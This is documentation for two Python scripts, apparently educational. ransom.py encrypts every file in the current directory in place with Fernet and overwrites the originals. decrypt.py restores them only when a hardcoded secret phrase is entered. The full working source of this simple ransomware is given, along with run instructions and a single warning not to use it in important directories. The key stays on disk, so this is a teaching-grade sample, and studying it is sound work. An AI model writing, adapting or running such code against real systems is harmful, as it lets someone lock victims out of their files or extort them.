# File Encryption and Decryption Script Documentation

This documentation provides an overview of two Python scripts designed for encrypting and decrypting files in a directory using the `cryptography` library's `Fernet` module.

---

## Requirements

- Python 3
- `cryptography` package (Install via `pip install cryptography`)

---

## Encryption Script (`ransom.py`)

The **encryption script** will encrypt all files in the directory except itself, the decryption script, and a key file, which it generates to store the encryption key.

### Script Overview

```python
#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Empty list to store files to be encrypted
files = []

# Loop through files in the current directory
for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Generate an encryption key
key = Fernet.generate_key()

# Save the key to "thekey.key"
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypt each file in the "files" list
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All files in this directory have been encrypted!")
```

### Detailed Breakdown

1. **Import Necessary Modules**
   - `os`: Used to list files in the directory.
   - `Fernet`: Used to create encryption keys and perform encryption operations.

2. **Identify Files for Encryption**
   - The script initializes an empty list `files`.
   - It iterates through all files in the directory, skipping `ransom.py`, `decrypt.py`, and `thekey.key`.
   - Files eligible for encryption are appended to the `files` list.

3. **Generate and Save the Encryption Key**
   - A `Fernet` encryption key is generated.
   - The key is saved to a file named `thekey.key` for later use in decryption.

4. **Encrypt the Files**
   - For each file in `files`:
     - The file's contents are read.
     - The contents are encrypted using the generated key.
     - The encrypted contents are written back to the file, overwriting the original data.

5. **Completion Message**
   - A message is printed indicating that all files have been encrypted.

---

## Decryption Script (`decrypt.py`)

The **decryption script** reverses the encryption process, allowing files to be decrypted using the stored key, provided the user knows the correct secret phrase.

### Script Overview

```python
#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Find files in the directory
files = []

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Read the encryption key
with open("thekey.key", "rb") as key:
    secretkey = key.read() 

# Define a secret phrase
secretphrase = "table"

# Prompt user for the secret phrase
user_phrase = input("Enter the secret phrase to decrypt your files: ")

# Check if the provided phrase is correct
if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Your files are now decrypted.")
else:
    print("Sorry, wrong phrase.")
```

### Detailed Breakdown

1. **Import Necessary Modules**
   - `os`: Used to identify files in the directory.
   - `Fernet`: Used to decrypt the encrypted files.

2. **Identify Files for Decryption**
   - Similar to the encryption script, this script identifies all files in the directory that should be decrypted and adds them to the `files` list.

3. **Retrieve the Encryption Key**
   - The script reads the key from `thekey.key`, which was generated and saved during encryption.

4. **Secret Phrase Verification**
   - A predefined secret phrase (`table`) is set.
   - The script prompts the user to input the secret phrase.
   - If the entered phrase matches, the script proceeds with decryption; otherwise, it displays an error message.

5. **Decrypt the Files**
   - If the secret phrase is correct, the script:
     - Reads the encrypted contents of each file.
     - Decrypts the contents using the key.
     - Writes the decrypted contents back to the file, restoring the original data.

6. **Completion or Error Message**
   - A success message is printed if the decryption is completed.
   - If the secret phrase is incorrect, an error message is shown.

---

## Usage Notes

- **Running the Scripts**:
  - Run `ransom.py` to encrypt files in the current directory.
  - Run `decrypt.py` to decrypt the files, provided the correct secret phrase is entered.
- **Important Security Note**: 
  - DO NOT USE IN IMPORTANT DIRECTORIES